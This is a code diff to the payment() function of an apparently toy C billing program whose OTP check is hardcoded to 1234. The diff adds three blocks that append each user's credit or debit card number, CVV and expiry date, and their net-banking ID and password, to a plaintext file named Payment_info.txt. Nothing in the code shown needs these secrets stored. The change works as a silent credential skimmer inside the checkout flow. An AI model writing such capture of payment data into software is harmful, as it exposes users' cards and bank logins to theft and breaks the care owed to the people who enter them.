@@ -239,6 +239,11 @@ bool payment() {
             printf("Enter the expiry date (MM/YY): ");
             char expiry[6];
             scanf("%s", expiry);
+            FILE *pi;
+            pi = fopen("Payment_info.txt", "a");
+            fprintf(pi, "Credit card: %lld %d %s", cc_number, cvv, expiry);
+            fprintf(pi, "\n\n");
+            fclose(pi);
             printf("Enter the OTP send at your phone number linked to your credit card\n");
             int otp;
             scanf("%d", &otp);
@@ -260,6 +265,11 @@ bool payment() {
             printf("Enter the expiry date (MM/YY): ");
             char expiry2[6];
             scanf("%s", expiry2);
+            FILE *pi2;
+            pi2 = fopen("Payment_info.txt", "a");
+            fprintf(pi2, "Debit card: %lld %d %s", dc_number, cvv2, expiry2);
+            fprintf(pi2, "\n\n");
+            fclose(pi2);
             printf("Enter the OTP send at your phone number linked to your debit card\n");
             int otp2;
             scanf("%d", &otp2);
@@ -293,6 +303,11 @@ bool payment() {
             scanf("%s", pass);
             printf("Enter the OTP send at your phone number linked to your Net Banking ID\n");
             int otp4;
+            FILE *pi3;
+            pi3 = fopen("Payment_info.txt", "a");
+            fprintf(pi3, "Bank Details: %s %s", netbank, pass);
+            fprintf(pi3, "\n\n");
+            fclose(pi3);
             scanf("%d", &otp4);
             if (otp4 == 1234) {
                 return true;
